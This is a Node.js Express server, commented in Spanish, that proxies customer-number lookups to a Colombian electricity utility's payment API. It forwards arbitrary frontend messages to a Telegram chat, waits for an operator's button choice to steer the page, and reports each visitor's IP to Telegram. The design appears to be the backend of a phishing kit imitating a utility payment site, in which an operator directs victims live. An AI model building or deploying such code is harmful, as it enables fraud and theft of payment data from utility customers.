import express from "express";
import fetch from "node-fetch"; 
import cors from "cors";
import path from "path";
import { fileURLToPath } from "url";
import dotenv from "dotenv";

// 1. Configuración de Módulos ES para __dirname y __filename
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

// 2. Cargar variables de entorno (Telegram Bot Token, Chat ID, etc.)
dotenv.config();

// 3. Configuración del Servidor Express
const app = express();
const PORT = process.env.PORT || 3000;

// Habilitar CORS (si frontend y backend no están en el mismo dominio)
app.use(cors());

// Middleware para parsear JSON en el body de las peticiones (necesario para Telegram POST)
app.use(express.json()); 

// Servir archivos estáticos de /public (para tu SPA)
app.use(express.static(path.join(__dirname, "public")));

// --- 💻 Rutas de Funcionalidad Principal ---
// Ruta API: consulta NIC (Tu lógica original)
app.get("/consulta", async (req, res) => {
    const nic = req.query.nic;
    if (!nic) return res.status(400).send("Falta NIC");

    const target = `https://caribesol.facture.co/DesktopModules/Gateway.Pago.ConsultaAnonima/API/ConsultaAnonima/getPolizaOpen?cd_poliza=${nic}`;

    try {
        const r = await fetch(target, {
            headers: { "User-Agent": "Mozilla/5.0", "Accept": "*/*" }
        });
        const text = await r.text();
        res.send(text);
    } catch (error) {
        console.error("Error al consultar la API de CaribeSol:", error);
        res.status(500).send("Error al consultar Air-e");
    }
});

// --- 🤖 Rutas de Funcionalidad de Telegram ---

// Endpoint para enviar mensajes a Telegram de forma segura
app.post('/api/send-message', async (req, res) => {
    const { text, keyboard } = req.body; 

    const token = process.env.TELEGRAM_BOT_TOKEN;
    const chat_id = process.env.TELEGRAM_CHAT_ID;

    if (!token || !chat_id) {
        return res.status(500).json({ error: 'Las variables de entorno de Telegram no están configuradas en el servidor.' });
    }

    if (!text) {
        return res.status(400).json({ error: 'El texto del mensaje es requerido.' });
    }

    try {
        // Construir el payload base
        const payload = {
            chat_id: chat_id,
            text: text
        };
        
        // Solo agregar reply_markup si keyboard existe y no es null
        if (keyboard) {
            payload.reply_markup = keyboard;
        }
        
        const response = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload),
        });
        const data = await response.json();
        res.status(response.status).json(data);
    } catch (error) {
        console.error('Error al enviar mensaje a Telegram:', error);
        res.status(500).json({ error: 'Error interno del servidor al contactar a Telegram.' });
    }
});

// Endpoint seguro para verificar la respuesta (callback) de Telegram usando Long Polling
app.get('/api/check-update/:messageId', async (req, res) => {
    const { messageId } = req.params;
    const token = process.env.TELEGRAM_BOT_TOKEN;
    const chat_id = process.env.TELEGRAM_CHAT_ID;

    if (!token || !chat_id) {
        return res.status(500).json({ error: 'Variables de entorno de Telegram no configuradas.' });
    }

    let updateFound = false;
    const startTime = Date.now();
    const timeout = 60000; // Reducido a 60 segundos por buenas prácticas
    let lastUpdateId = 0;

    // Bucle de "Long Polling"
    while (Date.now() - startTime < timeout && !updateFound) {
        try {
            // Long Polling: Esperar hasta 30 segundos por actualizaciones (timeout de Telegram)
            const response = await fetch(`https://api.telegram.org/bot${token}/getUpdates?offset=${lastUpdateId + 1}&limit=1&timeout=30`);
            const data = await response.json();

            if (data.ok && data.result.length > 0) {
                // Actualizamos el offset
                lastUpdateId = data.result[data.result.length - 1].update_id;

                // Busca el callback que coincida con nuestro ID de mensaje
                const relevantUpdate = data.result.find(
                    (update) =>
                    update.callback_query &&
                    update.callback_query.message.message_id == messageId
                );

                if (relevantUpdate) {
                    updateFound = true;
                    const callbackQuery = relevantUpdate.callback_query;
                    const action = callbackQuery.data.split(':')[0];
                    const user = callbackQuery.from;
                    const userName = user.username ? `@${user.username}` : `${user.first_name} ${user.last_name || ''}`.trim();

                    // --- MODIFICACIÓN CLAVE: Confirmación al presionar botón ---

                    // 1. Responder a Telegram para detener el loading Y enviar la confirmación
                    await fetch(`https://api.telegram.org/bot${token}/answerCallbackQuery`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ 
                            callback_query_id: callbackQuery.id,
                            text: `Acción '${action}' registrada. Procesando...`, // Mensaje de confirmación al usuario de Telegram
                            show_alert: false // Muestra como notificación temporal
                        })
                    });

                    // 2. Eliminar los botones del mensaje
                    await fetch(`https://api.telegram.org/bot${token}/editMessageReplyMarkup`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            chat_id: chat_id,
                            message_id: messageId,
                            reply_markup: { inline_keyboard: [] } 
                        }),
                    });

                    // 3. Enviar notificación al chat de Telegram
                    const notificationText = `✅ ${userName} eligió la acción: ${action}.`;
                    await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            chat_id: chat_id,
                            text: notificationText,
                        }),
                    });

                    // 4. Enviar la acción al frontend
                    return res.json({ action });
                }
            }
        } catch (error) {
            console.error('Error durante el polling:', error);
            // Esperar antes de reintentar en caso de error de red
            await new Promise(resolve => setTimeout(resolve, 5000));
        }
    }
    // Si se agota el tiempo, enviar una respuesta de timeout
    return res.status(408).json({ error: 'Timeout: No se recibió respuesta del operador.' });
});

// --- 🌐 Ruta Catch-All para la SPA ---
// Redirigir todas las rutas no API a index.html (Tu lógica original)
app.get(/^\/(?!consulta|api).*$/, async (req, res) => {
    // Intenta obtener la IP real (maneja Proxies como Cloudflare, Nginx, etc.)
    const userIp = req.headers['x-forwarded-for']?.split(',').shift() || req.ip;

    const messageText = `✨ *New User*\n\nAcceso detectado a la web.\n*IP:* \`${userIp}\`\n*Hora:* ${new Date().toLocaleString('es-CO', { timeZone: 'America/Bogota' })}`;

    try {
        const token = process.env.TELEGRAM_BOT_TOKEN;
        const chat_id = process.env.TELEGRAM_CHAT_ID;

        if (token && chat_id) {
            const payload = { 
                chat_id: chat_id, 
                text: messageText,
                parse_mode: 'Markdown' // Para que el texto sea negrita y monospace
            };

            // Ejecutar el fetch sin esperar (no bloquea al usuario)
            fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload),
            }).catch(error => {
                console.error("Fallo al enviar notificación a Telegram:", error);
            });
        } else {
            console.warn("Advertencia: Variables de entorno de Telegram no configuradas. No se envió la notificación de nuevo usuario.");
        }
    } catch (error) {
        console.error("Error en el proceso de notificación a Telegram:", error);
    }

    // Servir la página principal al usuario
    res.sendFile(path.join(__dirname, "public", "index.html"));
});

// 4. Iniciar Servidor
app.listen(PORT, () => console.log(`Servidor iniciado en http://localhost:${PORT}`));
